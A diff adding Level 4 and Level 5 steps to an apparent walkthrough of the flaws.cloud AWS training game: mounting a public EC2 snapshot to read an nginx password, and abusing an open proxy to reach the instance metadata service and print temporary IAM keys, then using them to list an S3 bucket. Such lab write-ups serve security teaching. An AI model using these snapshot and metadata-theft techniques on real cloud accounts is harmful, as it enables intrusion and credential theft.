@@ -170,6 +170,8 @@ Name:    s3-website-us-west-2.amazonaws.com
 Address:  52.218.201.35
 ```
 
+Identified that there is an S3 bucket in use.
+
 Use `aws` CLI on the domain:
 
 ```bash
@@ -218,6 +220,8 @@ Address:  127.0.0.1
 Name:    s3-website-us-west-2.amazonaws.com
 Address:  52.218.177.202
 ```
+
+Identified that there is an S3 bucket in use.
 
 Use `aws` CLI on the domain:
 
@@ -350,9 +354,154 @@ The Level 4 bucket URL was leaked which can be navigated to get us to Level 4.
 
 #### Level 4
 
+> For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+>
+> It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.
+
+Use `nslookup` on the given/known hostname:
+
+```bash
+C:\>nslookup 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+Server:  localhost
+Address:  127.0.0.1
+
+Non-authoritative answer:
+Name:    ec2-35-165-182-7.us-west-2.compute.amazonaws.com
+Address:  35.165.182.7
+Aliases:  4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+```
+
+Identified that an EC2 is in use.
+
+Use `aws` CLI on the domain:
+
+```bash
+C:\>aws --profile flaws-l3 ec2 describe-volumes --region us-west-2
+...
+```
+
+Try to look at any found snapshots:
+
+```bash
+C:\>aws --profile flaws-l3 ec2 describe-snapshots --snapshot-id snap-0f23409e560e2f059 --region us-west-2
+
+```
+
+Get user account info:
+
+```bash
+C:\>aws --profile flaws-l3 sts get-caller-identity
+{
+    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
+    "Account": "975426262029",
+    "Arn": "arn:aws:iam::975426262029:user/backup"
+}
+```
+
+Try to look at any snapshots owned by the user:
+
+```bash
+C:\>aws --profile flaws-l3 ec2 describe-snapshots --owner-id 975426262029 --region us-west-2
+...
+```
+
+```bash
+C:\>aws --profile cloudgoat ec2 describe-intances --region us-west2
+```
+
+Create a volume you own to attach the found snapshot to:
+
+<pre class="language-bash"><code class="lang-bash"><strong>C:\>aws --profile cloudgoat ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap...
+</strong>
+</code></pre>
+
+Attach the found snapshot to the volume that you created:
+
+<pre class="language-bash"><code class="lang-bash"><strong>C:\>aws --profile cloudgoat ec2 attach-volume --volume-id &#x3C;> --instance-id &#x3C;> --device /dev/sdf --region us-west-2
+</strong>
+</code></pre>
+
+Log into our instance and access the attached snapshot:
+
+```bash
+C:\>ssh -i itprotv-us-west.pem ubuntu@<IP>
+~$ lsblk  # Look at the block storage
+```
+
+Mount the new storage block:
+
+```bash
+sudo mount /dev/xvdf1 /mnt
+~$ cd /mnt
+```
+
+Enumerate mounted filesystem/data:
+
+```bash
+~$ cd /mnt/home/ubuntu
+~$ cat setupNginx.sh
+htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
+```
+
 #### Level 5
 
+> This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
+>
+> * http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
+> * http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
+> * http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/&#x20;
+>
+> See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.
+
+[http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/](http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/)
+
+Check for metadata by navigating to and enumerating each found location:
+
+[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/)
+
+[https://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest](https://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest)
+
+[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)
+
+And Access Key ID, Secret Access Key, and tokens are found:
+
+```json
+{
+  "Code" : "Success",
+  "LastUpdated" : "2022-12-15T21:45:50Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA6GG7PSQGRMFNA7VH",
+  "SecretAccessKey" : "q6a2Sprv7E1I505PvTGyleJbegO/g684v0L+QZ9v",
+  "Token" : "IQoJb3JpZ2luX2VjEM7//////////wEaCXVzLXdlc3QtMiJGMEQCIA+egW9aB4GhymwvQZujoz1SJwzi7FumIFpAj49IVGYvAiABcYFjldGUpiGdMomai9dsYvOXlLn5pK90IohA5hPRairVBAj3//////////8BEAMaDDk3NTQyNjI2MjAyOSIMs9ZW3OjPio+IRxGeKqkE5f7U2pocgG10S++NsKUW7XItKj4BnsbTeVSfGNyPajbHy5QEhwZU0BjVpTksI3GCoejsrEJc3mH0G6o6tIm5ZdDiV8VrJ7+/QIJ9x8hCHe3QxQpp10PjwMFh/gRPuk5rZuUNHG/gfzlnfGsvd9v2fsVj+f3zhlVRvL0NPUSJsW5uScKkB8d+HuG0/Ccrw3ADmTiz4NEI9TWjI0yQEiYlDD51L14R08ejD2XFdTPU3biGEEuYpCmUbZ6OMnDxeTTVa1QmdiRX2E3I/KbBj4EL67o10PWzSPlegu/gfospc1KZaepK3WfYDY0Vwwj+bepxFYwrjFWnCkHmnCG/WWTM1+1FGt1qiRMcid4O6DgPBVN/zOrpWsw7ibi24H5EHhn1tam7zXCDTAyqVzFWanME+C0CLz6ADH8IYA8T2xz2OqGs3iQX6nj5bpSKWIvIUbQXCNb290FAi+Zu9Mb7Sc45gXsEL0Y0IBSRMZkBl73jkuCCLmzseoOHft1CmMwt3ITgtTnFLR/rpb6aT3BZ9LIZPq5Lhxnqk1ajxznaQkSbOeEXOum/MFXEkkvbUviSP3PPIoPTq7N0PPAHbrnpL4AhUK59zJU58LD4Ms2IoMRSKpZwkV0YCbMTYfGFSIuYZRZdBJNPYMKtiMw61BPmY3KYG6R6utBKyr3d4e4oFWG8lAOjMfeaXKsEpgI7LHOUcsX3qq9ZtHc8e2JqoAiF/oFRZPL3WJIgToy+QjDUqu6cBjqqAa1saty2UoM4I34TShElODyrLD2p0HfiL7iHQwxM4fuzx+pz7ZKaVRx8evYSxxQ5BWy6s4Lc+8uYv5tRgB9XM7S42MMPytPL3wjwxCzWd2i0v9U12gUDZGxDAGRXXQRbIrPYQCQuZVW5VRHolIcnypWZiIbAYCCtgW/j4TyuVcuxRLlRlurgzR0wX6SG5NUb1YhjjLP/dfDj4N9/HFSo8w8IQ1fvGUQXbt4s",
+  "Expiration" : "2022-12-16T04:04:03Z"
+}
+```
+
+Configure a new profile with the found Access Key ID, Secret Access Key and token:
+
+```bash
+C:\flaws-level5>aws configure --profile flaws-l5
+AWS Access Key ID [None]: ASIA6GG7PSQGRMFNA7VH
+AWS Secret Access Key [None]: q6a2Sprv7E1I505PvTGyleJbegO/g684v0L+QZ9v
+Default region name [None]: us-west-2
+Default output format [None]:
+# Have to manually add the token to the .aws/credentials file
+aws_secret_token = <TOKEN>
+```
+
+Access the S3 bucket found at the give URL:
+
+```bash
+C:\>aws --profile flaws-l5 s3 ls level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+                           PRE ddcc78ff/
+2017-02-26 21:11:07        871 index.html
+```
+
+Found an interesting path, ddcc78ff/, appended to the URL which got us to Level 6.
+
 #### Level 6
+
+
 
 ### CloudGoat
 
